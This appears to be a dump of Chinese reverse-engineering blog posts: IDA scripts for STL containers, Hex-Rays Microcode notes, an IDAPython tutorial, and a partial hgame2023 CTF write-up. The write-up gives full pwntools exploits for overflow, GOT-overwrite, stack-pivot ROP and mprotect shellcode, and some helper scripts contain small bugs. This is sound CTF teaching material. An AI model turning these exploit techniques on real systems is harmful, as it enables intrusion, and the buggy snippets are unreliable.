idc.read_dbg_qword(objectAddr) result = &#39;&#39; i = 0 while True: onebyte = idc.read_dbg_byte(strPtr + i) if onebyte == 0: break else: result = chr(onebyte) i += 1 return result std::stringsteam可以看作是读写文件 内存分布： std::vector 固定长度 24 字节，3 个 dq 第一个指针字段指向数组起始地址 第二个指针字段指向数组最后元素地址 第三个指针字段指向最大内存地址 内存分布： IDA dump脚本 def vetor_dump(addr): ELEMENT_SIZE = 8 data_addr = [] vetor_base = idc.read_dbg_qword(addr + 0x0) vetor_end = idc.read_dbg_qword(addr + 0x8) for i in range(vetor_base,vetor_end,ELEMENT_SIZE): data_addr.append(i) return data_addr std::list 双向循环链表存储 头结构 + 节点结构 遍历长度可以用 size 字段确定 内存布局： IDA dump 脚本： def dump_stl_list(p_list_addr): data_addr = [] list_size = idc.read_dbg_qword(p_list_addr+0x10) cur_node = p_list_addr for i in range(list_size): cur_node = idc.read_dbg_qword(cur_node + 0x0) data_addr.append(cur_node + 0x10) std::deque 头结构 + 迭代器结构 适用 std::deque &#x2F; std::stack stl_deque.start.node 确定first map 项位置 stl_deque.start.last - stl_deque.start.first 确定缓冲区大小 stl_deque.finish.node 确定last map 项位置 对于每一个 map 项： start 项，解析 cur, last 区间 finish 项，解析 start, cur 区间 其余项，解析 start, last 区间 内存布局: IDA dump 脚本: deque_iter = namedtuple(&#39;deque_iter&#39;,[&#39;cur&#39;,&#39;first&#39;,&#39;last&#39;,&#39;node&#39;]) def parse_iter(addr): # 解析队列迭代器 cur = idc.read_dbg_qword(addr + 0x0) first = idc.read_dbg_qword(addr + 0x8) last = idc.read_dbg_qword(addr + 0x10) node = idc.read_dbg_qword(addr + 0x18) return deque_iter(cur,first,last,node) def dump_deque(addr): ELEMENT_SIZE = 4 # std::deque&lt;xx&gt; xx 的类型大小来指定 data_addr = [] start_iter = parse_iter(addr + 0x10) finish_iter = parse_iter(addr + 0x30) buf_size = start_iter.last - start_iter.first map_size = start_iter.node map_finish = finish_iter.node # 解析第一个缓存数据 for i in range(start_iter.cur,start_iter.last,ELEMENT_SIZE): data_addr.append(i) # 解析最后一个缓存数据 for i in range(finish_iter.first,finish_iter.cur,ELEMENT_SIZE): data_addr.append(i) # 解析中间缓存数据 for i in range(map_start + 8,map_finish - 8,8): buf_start = idc.read_dbg_qword(b) for i in range(buf_start,buf_start + buf_size, ELEMENT_SIZE): data_addr.append(i) return data_addr std::map 底层采用 Rb-Tree 实现（红黑二叉树） 头结构 + 节点结构 用二叉树遍历可提取数据 适用 std::map &#x2F; std::set &#x2F; std::multimap &#x2F; std::multiset 内存分布： IDA dump 脚本： def parse_gnu_map_header(address): root = idc.read_dbg_qword(address + 0x10) return root def parse_gnu_map_node(address): left = idc.read_dbg_qword(address + 0x10) right = idc.read_dbg_dword(address + 0x10) data = address + 0x20 return left, right, data def parse_gnu_map_travel(address): # address &lt;—— std::map struct address result = [] worklist = [parse_gnu_map_header(address)] while len(worklist) &gt; 0: addr = worklist.pop() (left, right, data) = parse_gnu_map_node(addr) if left &gt; 0: worklist.append(left) if right &gt; 0: worklist.append(right) result.append(data) return result std::unsorted_map 底层采用 HashTable 实现 头结构 + Bucket 数组 + 节点结构 所有节点结构用单链表串联（****dump 只需要遍历单链表） 头结构的第三个字段为单链表头 适用 **std::**unsorted_map **&#x2F; std::**unsorted_set &#x2F; … 内存布局: IDA dump 脚本: def dump_stl_hashmap(addr): # dump stl hashmap gnu c++ x64 data_addr = [] bucket_addr = idc.read_dbg_qword(addr + 0x10) node_addr = bucket_addr while node_addr != 0: data_addr.append(node_addr + 0x8) node_addr = idc.read_dbg_qword(node_addr) return data_addr std::shared_ptr第一个指针就是数据指针 内存布局： 实战部分","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"Windows逆向","slug":"re/Windows逆向","permalink":"https://pa1r0t.github.io/categories/re/Windows%E9%80%86%E5%90%91/"}],"tags":[]},{"title":"Microcode","slug":"Microcode","date":"2023-01-19T14:09:48.000Z","updated":"2024-06-25T14:02:03.256Z","comments":true,"path":"2023/01/19/Microcode/","link":"","permalink":"https://pa1r0t.github.io/2023/01/19/Microcode/","excerpt":"记录Microcode","text":"记录Microcode 介绍Microcode 是 hexrays 内部采用的介于机器代码与伪代码之间的一种中间表示语言(IR)。 Microcode 生成完成后，IDA 在 Microcode 的基础上生成 CTree。 CTree 是 IDA 内部用于表示 C语言伪代码的抽象语法树，IDA 也提供了大量 API 操作 CTree，可以实现一下伪代码展示方面的优化，例如删除某些节点等等。 Microcode 指令格式 opcode left, right, destination一般来说有三个操作数，有一些指令可能缺少某个操作数，destination 也不一定会被修改（Store 指令） Microcode 中常见的数据结构 函数是 IDA 中最大的汇编结果表示单位 函数 → 基本块 → 指令 → 操作数 Microcode 可视化插件 https://github.com/gaasedelen/lucid Ctree 可视化插件https://github.com/patois/HRDevHelper Microcode生成过程： 生成 Microcode 变换 Microcode （例如优化） 局部变量分配 生成 CTree （CTree 是 IDA 用来表示伪代码的抽象语法树 AST） 优化 CTree 输出 CTree Microcode 寄存器 microcode 的寄存器没有数量限制，物理寄存器往往会被直接映射到 microcode 寄存器，例如 AL is mapped into al.1 (mreg number 8) AH is mapped into ah.1 (mreg number 9) EAX is mapped into eax.4 (mreg numbers 8-11) RSI is mapped into rsi.8 Microcode 分阶段生成, 最初阶段生成的代码非常冗余 Microcode 快速上手，手动调用 microcode 生成 import ida_hexrays import idaapi def print_microcode(func_ea): maturity = ida_hexrays.MMAT_GLBOPT3 # maturity: # MMAT_ZERO, //&lt; microcode 不存在 # MMAT_GENERATED //&lt; 已经生成的microcode # MMAT_PREOPTIMIED //&lt; 预先优化的pass已完成 # MMAT_LOCOPT //&lt; local 本地每个基本块的优化已完成 control控制流图也就绪 # MMAT_CALLS //&lt; 检测调用参数 # MMAT_GLBOPT1 //&lt; 执行第一个全局优化pass # MMAT_GLBOPT2 //&lt; 大多数全局优化pass已完成 # MMAT_GLBOPT3 //&lt; 完成所有的优化，microcode被修改 # MMAT_LVAR3 //&lt; 分配所有的局部变量 hf = ida_hexrays.hexrays_failure_t() pfn = idaapi.get_func(func_ea) rng = ida_hexrays.mba_ranges_t(pfn) mba = ida_hexrays.gen_microcode(rng,hf,None, ida_hexrays.DECOMP_WARNINGS,maturity) vp = ida_hexrays.vd_printer_t() mba._print(vp) print_microcode(0x1229) Microcode 相关的数据结构，定义在 hexrays.hpp 文件 Microcode 相关的数据结构: mbl_array_t,这个结构用来存放函数的基本块信息 基本块之间使用双向链表链接 基本块数组存放在 natural 数组 Microcode 相关的数据结构: mblock_t,这个结构用来描述基本块信息。±基本块内的指令与指令之间使用双向链表链接 Microcode 相关的数据结构: minsn_t。用于描述指令信息的结构。（注意微码指令支持指令嵌套。） Microcode 相关的数据结构: mop_t 用于描述操作数信息的结构，指令 minsn_t 有 0 ~ 3 个操作数，分别时 l (left), r (right), d (destination) 操作数的类型用 mop_t 来表示 Microcode 插件例子 实现 svc 0x900001 与 svc 0x9000F8 指令反编译成一条 call 指令 install_microcode_filter 注册 microcode filter 实现拦截指令翻译 microcode filter 是一种可以拦截 microcode 指令生成的机制，开发者需要继承 microcode_filter_t 类并实现 match 与 apply 两个函数。 ida 在生成某一条指令的 microcode 之前会调用所有已经注册的 filter 的 match 函数，若 match 函数返回 True，则调用对应的 apply 函数实现指令替换。 我们需要将 svc 指令替换成 call 指令，ida 已经为我们实现了替换类 udc_filter_t, 这个类继承于 microcode_filter_t 并实现了 apply 方法（即替换call指令），我们需要继承 udc_filter_t 并实现它的 match 方法用于判断拦截的指令。 Microcode 插件例子","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"前置知识学习","slug":"re/前置知识学习","permalink":"https://pa1r0t.github.io/categories/re/%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"Microcode","slug":"Microcode","permalink":"https://pa1r0t.github.io/tags/Microcode/"}]},{"title":"IDAPython","slug":"IDAPython","date":"2023-01-19T09:52:02.000Z","updated":"2024-06-25T14:01:30.287Z","comments":true,"path":"2023/01/19/IDAPython/","link":"","permalink":"https://pa1r0t.github.io/2023/01/19/IDAPython/","excerpt":"记录ida脚本","text":"记录ida脚本 IDA Python 脚本编程内存分为： 本地内存 调试内存 常用脚本接口介绍寄存器操作（调试） idc.get_reg_value(&#39;rax’) idaapi.set_reg_val(&quot;rax&quot;, 1234) 读取 xmm 寄存器 def read_xmm_reg(name): rv = idaapi.regval_t() idaapi.get_reg_val(name,rv) return (struct.unpack(&quot;Q&quot;,rv.bytes())[0]) 调试内存操作 dbg 是指debug内存（调试内存） idc.read_dbg_byte(addr) idc.read_dbg_word(addr) idc.read_dbg_dword(addr) idc.read_dbg_qword(addr) idc.read_dbg_memory(addr,size) idc.patch_dbg_byte(addr,val) 调试内存读写封装 def patch_dbg_mem(addr,data): for i in range(len(data)): idc.patch_dbg_byte(addr+i,data[i]) def read_dbg_mem(addr,size): dd = [] for i in range(size): dd.append(idc.read_dbg_byte(addr+i)) return bytes(dd) 本地内存操作（会修改idb数据库） idc.get_qword(addr) idc.patch_qword(addr,val) idc.patch_dword(addr,val) idc.patch_word(addr,val) idc.patch_byte(addr,val) idc.get_bytes(addr,size) 反汇编操作 idc.GetDisasm(addr) # 只能返回一条汇编指令 idc.next_head(addr) # 获取下一条汇编指令的地址 交叉引用分析 for ref in idautils.XrefsTo(ea): print(hex(ref.frm)) 杂项常用接口 idc.add_bpt(addr) # 添加断点 idaapi.get_imagebase() # 获取基地址 idc.create_insn(addr) # 生成汇编指令，相当于快捷键C 常用于固件分析 ida_funcs.add_func(addr) # 生成函数，相当于快捷键p ida_bytes.create_strlit(addr) # 生成字符串，相当于快捷键A 函数遍历 for func in idautils.Functions(): print(&quot;0x%x,%s&quot; % (func,idc.get_func_name(func))) 基本块的遍历 fn = 目标函数地址 f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS) for blocks in f_blocks: print(hex(blocks.start_ea)) # 基本块的前驱 for pre in blocks.preds(): print(hex(pre.start_ea)) # 基本块的后继 for sucess in blocks.succs(): print(hex(sucess.start_ea)) 指令遍历 for ins in idautils.FuncItems(addr): print(hex(ins)) 实战部分ollvm批量断点设置： 实验材料：ollvm-flat 注意：判断真实块的依据是查找 ollvm 汇集点基本块的交叉引用，不一定准确 断点脚本： import idc import idaapi import struct import idautils # ollvm函数地址 fn = 0x401F60 # ollvm基本块汇集地址 ollvm_tail = 0x405D4B # 拿到函数基本块的迭代器 f_blocks = idaapi.FlowChart(idaapi.get_func(fn),flags=idaapi.FC_PREDS) # 然后遍历函数基本块 for block in f_blocks: # 拿到每个基本块的后驱 for sucess in block.succs(): if sucess.start_ea == ollvm_tail: print(hex(block.start_ea)) idc.add_bpt(block.start_ea) 复制到ida下面，摁回车两次就行 成功打上断点，打上断点的基本块都是真实块 断点管理 全选右键生成文件夹 点击文件夹，进行断点的批量禁用或启用 条件断点脚本编写： 实验材料：dump_test.exe 目标：设置一个条件断点，当 rand 函数返回值为 16949 时停下 找到random函数 设置断点 在断点处右键编辑断点 脚本： import idc import idaapi import struct import idautils def bp(): rax = idc.get_reg_value(&#39;rax&#39;) return rax == 16949 先在ida中执行脚本 然后编辑断点，增加condition条件 然后运行程序 程序停下来后，就查看rax寄存器，经过16进制转10进制，结果正确 条件断点运用：dump rand 函数每一次执行结果，不让程序停下来 脚本：条件断点函数返回 False，IDA 不会命中该断点,利用这个特性提取运行时数据 def bp(): rax = idc.get_reg_value(&#39;rax&#39;) print(rax,end=&#39;,&#39;) return False","categories":[{"name":"re","slug":"re","permalink":"https://pa1r0t.github.io/categories/re/"},{"name":"技巧与典型场景","slug":"re/技巧与典型场景","permalink":"https://pa1r0t.github.io/categories/re/%E6%8A%80%E5%B7%A7%E4%B8%8E%E5%85%B8%E5%9E%8B%E5%9C%BA%E6%99%AF/"}],"tags":[{"name":"IDA","slug":"IDA","permalink":"https://pa1r0t.github.io/tags/IDA/"}]},{"title":"hgame2023","slug":"hgame2023","date":"2023-01-14T02:09:49.000Z","updated":"2024-06-25T14:00:44.710Z","comments":true,"path":"2023/01/14/hgame2023/","link":"","permalink":"https://pa1r0t.github.io/2023/01/14/hgame2023/","excerpt":"复现hgame","text":"复现hgame week1crypto兔兔的车票题目： from PIL import Image from Crypto.Util.number import * from random import shuffle, randint, getrandbits flagImg = Image.open(&#39;flag.png&#39;) width = flagImg.width height = flagImg.height def makeSourceImg(): colors = long_to_bytes(getrandbits(width * height * 24))[::-1] #生成图像吧 img = Image.new(&#39;RGB&#39;, (width, height)) x = 0 #写像素 for i in range(height): for j in range(width): img.putpixel((j, i), (colors[x], colors[x + 1], colors[x + 2])) x += 3 return img def xorImg(keyImg, sourceImg): # 生成图片 img = Image.new(&#39;RGB&#39;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return img n1 = makeSourceImg() n2 = makeSourceImg() n3 = makeSourceImg() nonce = [n1, n2, n3] #三张图片 index = list(range(16)) #生成0~16的序列 shuffle(index) # 打乱序列 e=0 &quot;&quot;&quot; 这里flag.png已经提前被保存在source文件夹下了，文件名也是picture&#123;xx&#125;.png &quot;&quot;&quot; for i in index: im = Image.open(f&quot;source/picture&#123;i&#125;.png&quot;) key = nonce[randint(0, 2)] encImg = xorImg(key, im) encImg.save(f&#39;pics/enc&#123;e&#125;.png&#39;) e+=1 解法：原先我看着只有enc.png,其他啥都没有，怎么个异或？后来也注意到key只有三个，考虑过重复的情况，但是我发现仅有一个enc.png,还是没法搞出原图，后来看了别人的wp，才知道，只要flag.png^picture.png就行，因为它的picture.png原本的就没啥像素，enc.png大部分还是key的像素，所以找到一张存在flag.png的图片，将key异或掉就行，最终虽然得不到真正得flag.png但模糊程度也不高。这里对16张图片笛卡尔积级别异或就行 最后解密代码： from PIL import Image from Crypto.Util.number import * from random import shuffle, randint, getrandbits flagImg = Image.open(f&#39;pics/enc&#123;0&#125;.png&#39;) width = flagImg.width height = flagImg.height flagImg.close() def xorImg(keyImg, sourceImg): # 生成图片 img = Image.new(&#39;RGB&#39;, (width, height)) for i in range(height): for j in range(width): p1, p2 = keyImg.getpixel((j, i)), sourceImg.getpixel((j, i)) img.putpixel((j, i), tuple([(p1[k] ^ p2[k]) for k in range(3)])) return img for i in range(16): for j in range(16): imi = Image.open(f&quot;pics/enc&#123;i&#125;.png&quot;) imj = Image.open(f&quot;pics/enc&#123;j&#125;.png&quot;) xorimg = xorImg(imj, imi) xorimg.save(f&#39;source/xor&#123;i*16+j&#125;.png&#39;) imi.close() imj.close() 最后获得模糊的flag图片： 神秘的电话题目： 一个疑似base64编码的txt文件 一个播放起来是一个摩斯密码的wav文件 解法： 提取出声音文件的信息： morse2ascii morse.wav base64解码： 篱笆一一&gt;栅栏密码；倒着一一&gt;逆序；密匙一一&gt;维吉尼亚密码;北欧神话一一&gt;vidar （这里用morse2ascii计算出的数据多了一些下划线，做法是每一处下划线都去掉一个就行） 最后flag: PWNeasy_overflow他妈的，这道死活搞不出来，看了wp才知道是close函数关闭了标准输出通道。需要在来个报错输出，把结果输出过来 题目没啥好讲的，直接上exp from pwn import * io = process(&#39;./vuln&#39;) # io = remote(&quot;week-1.hgame.lwsec.cn&quot;,31267) elf = ELF(&#39;./vuln&#39;) # main_addr = elf.sym[&#39;main&#39;] back_addr = elf.sym[&#39;b4ckd0or&#39;] payload = b&#39;A&#39;*16 + p64(0) + p64(back_addr) io.sendline(payload) io.interactive() 运用1&gt;&amp;2将结果从报错信息中输出 choose_the_seat**HINTS:**数组下标的检查好像少了点东西 下标v0没有检查下界 seats在bss段，并只有seats写入。无法进行栈操作 思路：运用负下标进行got表覆盖，用got表泄漏libc的地址 先用vuln函数覆盖exit的地址，防止程序退出，方便下次再次利用 再用setbuf的plt表进行泄漏got地址，再用指定的libc计算基地址 用基地址计算system的地址，再用system的地址覆盖puts的地址，puts地址的旁边正好可以存放binsh的地方，连着binsh一起覆盖了 exp： from pwn import * io = process(&#39;./vuln&#39;) # io = remote(&#39;week-1.hgame.lwsec.cn&#39;,30536) context.terminal = [&quot;tmux&quot;,&quot;splitw&quot;,&quot;-h&quot;] context.log_level = &#39;debug&#39; def b(): gdb.attach(io) pause() elf = ELF(&quot;./vuln&quot;) libc = ELF(&#39;./libc-2.31.so&#39;) vuln_addr = elf.sym[&#39;vuln&#39;] sys_libc = libc.sym[&#39;system&#39;] libc_setbuf_addr = libc.sym[&#39;setbuf&#39;] print(&#39;setbuf:&#39;,hex(libc_setbuf_addr)) io.sendlineafter(b&#39;one.&#39;,str(-6)) io.sendafter(b&#39;your name&#39;,p64(vuln_addr)) print(&quot;vuln&quot;,vuln_addr) b() io.sendlineafter(b&#39;one.&#39;,str(-8)) io.sendafter(b&#39;your name&#39;,b&#39;\\xd0&#39;) io.recvuntil(b&#39;name is &#39;) setbuf_addr = u64(io.recvuntil(&#39;Your seat&#39;).split(b&#39;\\nYour&#39;)[0].ljust(8,b&#39;\\0&#39;)) print(&#39;addr:&#39;,hex(setbuf_addr)) base_addr = setbuf_addr - libc_setbuf_addr sys_addr = base_addr + sys_libc io.sendlineafter(b&#39;one.&#39;,str(-9)) payload = b&#39;/bin/sh\\x00&#39; + p64(sys_addr) io.sendafter(b&#39;your name&#39;,payload) io.interactive() 这里在覆盖setbuf的地址时会写一个字母，字母所占位置不超过0x1000，因为一个内存页就是0x1000，所以无论基地址如何变，函数在内存页中的偏移地址不变，所以我们写一个字母也只是占用了偏移位置，对计算基地址并不会影响，所以我们查看指定libc中的setbuf（静态），将得到的setbuf的地址的偏移数值和我们泄漏出的偏移数值改成相同，再减去我们泄漏出的总值就能得到base_addr 下面把d0换成41就行，41就是我们写进去的’A’ 如何这里减去总值： 这里还有一种做法就是写入\\xd0,就是让地址不发生变化，这样计算基地址直接减去sym中找的地址就行，其实这种做法也就方便了一点点 io.sendafter(b&#39;your name&#39;,b&#39;\\xd0&#39;) io.recvuntil(b&#39;name is &#39;) setbuf_addr = u64(io.recvuntil(&#39;Your seat&#39;).split(b&#39;\\nYour&#39;)[0].ljust(8,b&#39;\\0&#39;)) print(&#39;addr:&#39;,hex(setbuf_addr)) binsh的地址正好是下标0x10的整数倍，然后后面就是puts的地址，可以说出题人别有用心了 这里有两种做法，一种是从-9这个下标写入binsh的字符串和system的地址，让程序调用puts间接调用sytem函数 第二种做法就是用one_gadget查找libc中，执行binsh的指令 这里其实条件比较苛刻，要求一些寄存器中的地址对应的内容为null，这里存在偶然性，不过也是可以的 所以我们采用第一种方法 io.sendlineafter(b&#39;one.&#39;,str(-9)) payload = b&#39;/bin/sh\\x00&#39; + p64(sys_addr) io.sendafter(b&#39;your name&#39;,payload) 这里我们可以先打开tmux终端，在tmux运行exp，前提是exp设置了context.terminal &#x3D; [“tmux”,”splitw”,”-h”]，然后进行gdb.attch 这里方便起见我们可以设置一个调试函数，方便exp运行时临时调试程序 def b(): gdb.attach(io) pause() 将这个函数放置到我们想调试的地方 效果： 然后再gdb先后输入got一一&gt;p&#x2F;x *(地址),就可以查看某个got中的内容了 这里吐槽一下，其实gdb新版本可以直接看到got表的内容，我这个gdb已经是ubuntu20.02的最高版本了，我这个docker就不折腾了 （PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。解法：内存是以页载入机制，如果开启PIE保护的话，只能影响到单个内存页，一个内存页大小为0x1000，那么就意味着不管地址怎么变，某一条指令的后三位十六进制数的地址是始终不变的。因此我们可以通过覆盖地址的后几位来可以控制程序的流程） 结果： ORWCTF中这类PWN题目通常通过禁用execve系统调用添加沙箱，不能直接执行命令getshell，这时候需要通过调用open、read、write这样的函数打开flag，存到内存中，再输出 将三个函数开头字母作为简称，也就是orw 可以通过seccomp-tools来判断是否添加沙箱，以及查看沙箱的规则 seccomp-tools dump ./pwn 像这样就是比较经典的只允许64位的read、write、open三个系统调用，其他的系统调用号都被禁止 这里需要用到栈迁移 栈迁移的本质就是控制rsp和rbp，将栈帧转移到我们想要的位置，这里需要执行两次leave;return。 leave&#x3D;mov rsp,rbp;pop rbp 所以第一次不能将rsp进行改变 第一次是将rbp转移，第二次是将rsp转移。 栈迁移条件： 存在 leave ret 这类gadget指令 存在可执行shellcode的内存区域 链接：栈迁移原理介绍与应用 - Max1z - 博客园 (cnblogs.com) 这里说明一下：open拿到的只是文件句柄，里面没有文件内容，要读文件内容还是要执行read，read的参数就要求文件句柄，read的功能就是将硬盘文件内容读到内存中的某一块缓冲区中，然后write负责将缓冲区中的内容写进屏幕中 题目中溢出长度为0x30,那注入地址为0x30&#x2F;0x8&#x3D;6,就6条显然不能构成rop链 进行栈迁移，由于我没做过栈迁移的题，这里详细写一下 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址,rbp放到bss+0x200，这个地址其实是程序地址之外的空间了，所以拿来当作新栈对程序不产生影响 payload1 = b&#39;A&#39; * 0x100 + p64(bss+0x200) payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr) 计算基地址，算出orw三个函数的地址 success(&#39;puts:&#39;,hex(puts_addr)) base_addr = puts_addr - libc_puts open_addr = libc.sym[&#39;open&#39;] + base_addr read_addr = libc.sym[&#39;read&#39;] + base_addr write_addr = libc.sym[&#39;write&#39;] + base_addr 第二次溢出，将rbp放置到新栈 payload = b&quot;a&quot; * 0x100 payload += p64(bss + 0x200) payload += p64(vuln_addr + 0x0F) io.send(payload) 执行完第二次溢出后，rsp在旧栈位置，rbp在新栈位置，为了让rbp在新栈位置不发生移动，这里我们直接将之后的函数直接定位到read函数上，+0xf，因为read函数之前有对rbp和rsp进行操作 第三次溢出，将进行两次leave；ret，这样rsp就将锁定在新栈的栈顶位置，因为ret主要是靠rsp来控制程序流，rbp只是拿来定位局部变量 payload2 = b&#39;/flag\\x00\\x00\\x00&#39; payload2 += p64(pop_rdi_ret) payload2 += p64(0x404160) #这里就是新rbp-0x100的地方，也就是刚写&#39;/flag\\x00\\x00\\x00&#39;的地址 payload2 += p64(pop_rsi_ret) payload2 += p64(0) payload2 += p64(open_addr) payload2 += p64(pop_rdi_ret) payload2 += p64(0x3) payload2 += p64(pop_rsi_ret) payload2 += p64(0x404711) # 可能是指定缓冲区地址 payload2 += p64(pop_rdx_ret) payload2 += p64(0x100) payload2 += p64(read_addr) payload2 += p64(pop_rdi_ret) payload2 += p64(0x1) payload2 += p64(pop_rsi_ret) payload2 += p64(0x404711) payload2 += p64(pop_rdx_ret) payload2 += p64(0x100) payload2 += p64(write_addr) payload2 = payload2.ljust(0x100,b&#39;a&#39;) payload2 += p64(0x404160) # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去 payload2 += p64(leave_ret_addr) 所以第三次的rbp最终位置不用去管它，rbp的任务就是让rsp锁定到新栈栈顶位置就行 这里read和write都需要三个参数，64位，函数从左到右寄存器分别是rdi,rsi,rdx 通过pop ret指令来控制rsp从而控制程序流 以上就是栈迁移的详细内容 完整代码： from pwn import * # io = process(&#39;./vuln&#39;) io = remote(&#39;week-1.hgame.lwsec.cn&#39;,31266) elf = ELF(&#39;./vuln&#39;) libc = ELF(&#39;libc-2.31.so&#39;) context.log_level = &quot;debug&quot; context.terminal = [&quot;konsole&quot;, &quot;-e&quot;] vuln_addr = elf.sym[&#39;vuln&#39;] libc_puts = libc.sym[&#39;puts&#39;] puts_got = elf.got[&#39;puts&#39;] puts_plt = elf.plt[&#39;puts&#39;] leave_ret_addr = 0x4012be pop_rdi_ret = 0x0401393 bss = 0x404060 # 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址 payload1 = b&#39;A&#39; * 0x100 + p64(bss+0x200) payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr) io.sendafter(&#39;task.\\n&#39;,payload1) puts_addr = u64(io.recvline().split(b&#39;\\n&#39;)[0].ljust(8,b&#39;\\0&#39;)) success(&#39;puts:&#39;,hex(puts_addr)) base_addr = puts_addr - libc_puts open_addr = libc.sym[&#39;open&#39;] + base_addr read_addr = libc.sym[&#39;read&#39;] + base_addr write_addr = libc.sym[&#39;write&#39;] + base_addr pop_rsi_ret = 0x02601f + base_addr pop_rdx_ret = 0x142c92 + base_addr payload = b&quot;a&quot; * 0x100 payload += p64(bss + 0x200) payload += p64(vuln_addr + 0x0F) io.send(payload) # 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置 payload2 = b&#39;/flag\\x00\\x00\\x00&#39; payload2 += p64(pop_rdi_ret) payload2 += p64(0x404160) #这里就是新rbp-0x100的地方，也就是刚写&#39;/flag\\x00\\x00\\x00&#39;的地址 payload2 += p64(pop_rsi_ret) payload2 += p64(0) payload2 += p64(open_addr) payload2 += p64(pop_rdi_ret) payload2 += p64(0x3) payload2 += p64(pop_rsi_ret) payload2 += p64(0x404711) # 指定缓冲区地址,随意 payload2 += p64(pop_rdx_ret) payload2 += p64(0x100) payload2 += p64(read_addr) payload2 += p64(pop_rdi_ret) payload2 += p64(0x1) payload2 += p64(pop_rsi_ret) payload2 += p64(0x404711) payload2 += p64(pop_rdx_ret) payload2 += p64(0x100) payload2 += p64(write_addr) payload2 = payload2.ljust(0x100,b&#39;a&#39;) payload2 += p64(0x404160) # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去 payload2 += p64(leave_ret_addr) # gdb.attach(io) io.send(payload2) io.interactive() 最后结果： 这里还有一种做法，原本程序开启了NX保护，我们可以通过libc中的mprotect函数给一段内存区域更改权限，然后在栈中写入shellcode，然后让程序执行栈中的shellcode，这里shellcode也很长，也需要用到栈迁移 payload2 = p64(0) #0x404160 payload2 += p64(pop_rdi_ret) payload2 += p64(0x404000) #这里是mprotect函数要操作的开始地址 #0x404170 payload2 += p64(pop_rsi_ret) payload2 += p64(0x1000) # 要操作的大小 #0x404180 payload2 += p64(pop_rdx_ret) payload2 += p64(7) # 7代表可读可写可执行权限 #0x404190 payload2 += p64(mprotect_addr) payload2 += p64(0x4041a8) #0x4041a0 payload2 += asm(shellcraft.open(&quot;/flag&quot;,1)) payload2 += asm(shellcraft.read(3,0x404500,100)) payload2 += asm(shellcraft.write(1,0x404500,100)) payload2 = payload2.ljust(0x100,b&#39;a&#39;) payload2 += p64(0x404160) # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去 payload2 += p64(leave_ret_addr) mprotect参数有三，起始地址，长度，权限 这里程序出了bug，flag中g实在写不进去不知道为啥(更新，没设置64位，加上context.arch &#x3D; “amd64”这句就行，因为系统默认32位，&#x2F;flag的字符串正好超出4字节数据) 完整代码： from pwn import * # io = process(&#39;./vuln&#39;) io = remote(&#39;week-1.hgame.lwsec.cn&#39;,31266) elf = ELF(&#39;./vuln&#39;) libc = ELF(&#39;libc-2.31.so&#39;) # context.log_level = &quot;debug&quot; # context.terminal = [&quot;konsole&quot;, &quot;-e&quot;] context.arch = &quot;amd64&quot; vuln_addr = elf.sym[&#39;vuln&#39;] libc_puts = libc.sym[&#39;puts&#39;] puts_got = elf.got[&#39;puts&#39;] puts_plt = elf.plt[&#39;puts&#39;] leave_ret_addr = 0x4012be pop_rdi_ret = 0x0401393 bss = 0x404060 # 第一次溢出，把rbp放到别的地方,然后泄漏puts的内存地址 payload1 = b&#39;A&#39; * 0x100 + p64(bss+0x200) payload1 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr) io.sendafter(&#39;task.\\n&#39;,payload1) puts_addr = u64(io.recv(6).ljust(8,b&#39;\\0&#39;)) success(&#39;puts:&#39;,hex(puts_addr)) base_addr = puts_addr - libc_puts mprotect_addr = libc.sym[&#39;mprotect&#39;] + base_addr pop_rsi_ret = 0x02601f + base_addr pop_rdx_ret = 0x142c92 + base_addr payload = b&quot;a&quot; * 0x100 payload += p64(bss + 0x200) payload += p64(vuln_addr + 0x0F) io.send(payload) # 第二次溢出，将rbp放到二次写入的开始处，将rsp放到与rbp相同位置 payload2 = p64(0) #0x404160 payload2 += p64(pop_rdi_ret) payload2 += p64(0x404000) #这里是mprotect函数要操作的开始地址 #0x404170 payload2 += p64(pop_rsi_ret) payload2 += p64(0x1000) # 要操作的大小 #0x404180 payload2 += p64(pop_rdx_ret) payload2 += p64(7) # 7代表可读可写可执行权限 #0x404190 payload2 += p64(mprotect_addr) payload2 += p64(0x4041a8) #0x4041a0 payload2 += asm(shellcraft.open(&quot;/flag&quot;,1)) payload2 += asm(shellcraft.read(3,0x404500,100)) payload2 += asm(shellcraft.write(1,0x404500,100)) payload2 = payload2.ljust(0x100,b&#39;a&#39;) payload2 += p64(0x404160) # 这里就是第一次pop rbp后rbp的位置，第二次pop要往我们想要的栈顶走，把rsp移过去 payload2 += p64(leave_ret_addr) # gdb.attach(io) io.send(payload2) io.interactive() simple_shellcode题目： int __cdecl main(int argc, const char **argv, const char **envp) &#123; init(argc, argv, envp); mmap((void *)0xCAFE0000LL, 0x1000uLL, 7, 33, -1, 0LL); puts(&quot;Please input your shellcode:&quot;); read(0, (void *)0xCAFE0000LL, 0x10uLL); sandbox(); MEMORY[0xCAFE0000](); return 0; &#125; 题目用mmap映射出一段以0xCAFE0000开始，长度为0x1000，权限是7（可读可写可执行） 用sandbox设置了系统权限 